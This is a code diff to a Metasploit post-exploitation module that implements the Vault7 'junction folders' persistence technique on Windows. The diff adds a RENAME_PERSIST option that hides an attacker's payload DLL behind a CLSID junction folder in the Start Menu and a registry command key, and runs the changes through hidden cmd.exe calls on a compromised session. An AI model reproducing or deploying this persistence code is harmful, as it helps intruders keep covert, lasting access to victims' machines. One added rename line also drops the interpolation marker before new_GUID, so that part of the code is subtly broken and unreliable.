@@ -15,19 +15,25 @@
 #
 #
 # [ DESCRIPTION ]
-# Implementation of vault7 junction folders persistence mechanism. A junction folder in Windows is a
-# method in which the user can cause a redirection to another folder. This module will add a registry hive in
-# 'HKCU\software\Classes\CLSID\{GUID}' and use the sub-key '\Shell\Manage\Command' to execute our payload, then
-# builds a Folder named POC.{GUID} under 'Start Menu\Programs\Accessories' (in persistence mode), In DEMO mode
-# it will take the full path to POC folder and payload path from user inputs, Check in module ADVANCED OPTIONS
-# to use the 'explorer persistence mode'.
+# Implementation of vault7 junction folders persistence mechanism. A junction folder in Windows is a method
+# in which the user can cause a redirection to another folder/appl. This module will add a registry hive in
+# 'HKCU\software\Classes\CLSID\{GUID}' and use the sub-key '\Shell\Manage\Command' to execute our payload,
+# then builds a Folder named POC.{GUID} under 'Start Menu\Programs\Accessories' (in persistence mode).
+# In DEMO mode it will take the full path to POC folder and payload path from user inputs. also Check in
+# module ADVANCED OPTIONS for 'PERSIST_EXPLORER' (payload.dll) or 'RENAME_PERSIST' (payload.dll) options.
 #
 #
 # [ MODULE OPTIONS ]
-# The session number to run this module on    => set SESSION 3
-# The full path of the appl to run or payload => set APPL_PATH C:\\Windows\\System32\\calc.exe
-# The full path and name of folder to create  => set FOLDER_PATH C:\\Users\\%username%\\Destop\\POC
-# Use explorer.exe to persiste your agent?    => set PERSIST_EXPLORER true
+# The session number to run this module on           => set SESSION 3
+# The full path of the appl to run or payload        => set APPL_PATH C:\\Windows\\System32\\calc.exe
+# The full path and name of folder to create         => set FOLDER_PATH C:\\Users\\%username%\\Destop\\POC
+# Use explorer Start Menu to persiste our agent.dll? => set PERSIST_EXPLORER true
+# Rename ..\\Start Menu\\..\\Accessories.{GUID}?     => set RENAME_PERSIST true
+# ----------------------------------------------------------------------------------------------------
+# WARNING: 'PERSIST_EXPLORER' and 'RENAME_PERSIST' technics were tested using one payload.DLL and
+# 'RENAME_PERSIST' option will rename %AppData%\\microsoft\\windows\\Start Menu\\Programs\\Accessories
+# to: %AppData%\\microsoft\\windows\\Start Menu\\Programs\\Accessories.{GUID} <--juntion folder
+# ----------------------------------------------------------------------------------------------------
 #
 #
 #
@@ -89,17 +95,17 @@ class MetasploitModule < Msf::Post
                 super(update_info(info,
                         'Name'          => 'vault7 junction folders [User-level Persistence]',
                         'Description'   => %q{
-                                        Implementation of vault7 junction folders persistence mechanism. A junction folder in Windows is a method in which the user can cause a redirection to another folder. This module will add a registry hive in 'HKCU\software\Classes\CLSID\{GUID}' and use the sub-key '\Shell\Manage\Command' to execute our payload, then builds a Folder named POC.{GUID} under 'Start Menu\Programs\Accessories' (in persistence mode), In DEMO mode it will take the full path to POC folder and payload path from user inputs, Check in module ADVANCED OPTIONS to use the 'explorer persistence mode'.
+                                        Implementation of vault7 junction folders persistence mechanism. A junction folder in Windows is a method in which the user can cause a redirection to another folder/appl. This module will add a registry hive in 'HKCU\software\Classes\CLSID\{GUID}' and use the sub-key '\Shell\Manage\Command' to execute our payload, then builds a Folder named POC.{GUID} under 'Start Menu\Programs\Accessories' (in persistence mode), In DEMO mode it will take the full path to POC folder and payload path from user inputs. also Check in module ADVANCED OPTIONS for 'PERSIST_EXPLORER' (payload.dll) or 'RENAME_PERSIST' (payload.dll) options.
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
                                 [
-                                        'Module Author: r00t-3xp10it',  # post-module author
-                                        'Vuln discover: vault7 | nsa',  # vulnerability credits
-                                        'special thanks: betto(ssa)',   # module debug help
+                                        'Module Author: r00t-3xp10it',                  # post-module author
+                                        'Vuln discover: vault7 | wikileaks | nsa',      # vulnerability credits
+                                        'special thanks: browninfosecguy | betto(ssa)', # module debug help
                                 ],
  
-                        'Version'        => '$Revision: 1.2',
+                        'Version'        => '$Revision: 1.3',
                         'DisclosureDate' => 'jun 1 2018',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
@@ -136,7 +142,8 @@ class MetasploitModule < Msf::Post
 
                 register_advanced_options(
                         [
-                                OptBool.new('PERSIST_EXPLORER', [ false, 'Use explorer.exe to persiste our agent?' , false]),
+                                OptBool.new('PERSIST_EXPLORER', [ false, 'Use explorer Start Menu to persiste our agent.dll?' , false]),
+                                OptBool.new('RENAME_PERSIST', [ false, 'Rename ..\\Start Menu\\..\\Accessories.{GUID}?' , false])
                         ], self.class) 
 
         end
@@ -289,6 +296,13 @@ def run
            r = session.sys.process.execute("cmd.exe /R mkdir #{folder_poc}.#{new_GUID}", nil, {'Hidden' => true, 'Channelized' => true})
            r.channel.close
            r.close
+         elsif datastore['RENAME_PERSIST'] == true
+           ren_per = "\"#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\""
+           print_status("Creating juntion shell folder ..")
+           Rex::sleep(1.0)
+        r = session.sys.process.execute("cmd.exe /R rename #{ren_per} #{ren_per}.{new_GUID}", nil, {'Hidden' => true, 'Channelized' => true})
+           r.channel.close
+           r.close
          else
            print_status("Creating juntion shell folder ..")
            Rex::sleep(1.0)
@@ -309,6 +323,17 @@ def run
          print_line("")
          print_line("    To delete all changes made:")
          print_line("    cmd.exe /c reg delete \"#{hive_key}\\#{new_GUID}\" /f")
+         print_line("--------------------------------")
+         Rex::sleep(1.0)
+       elsif datastore['RENAME_PERSIST'] == true
+         ren_per = "\"#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\""
+         print_good("Module execution finished ..")
+         print_line("--------------------------------")
+         print_line("    Trigger exploit: #{ren_per}")
+         print_line("")
+         print_line("    To delete all changes made:")
+         print_line("    cmd.exe /c reg delete \"#{hive_key}\\#{new_GUID}\" /f")
+         print_line("    cmd.exe /c rename \"#{ren_per}.{new_GUID} #{ren_per}\"")
          print_line("--------------------------------")
          Rex::sleep(1.0)
        else
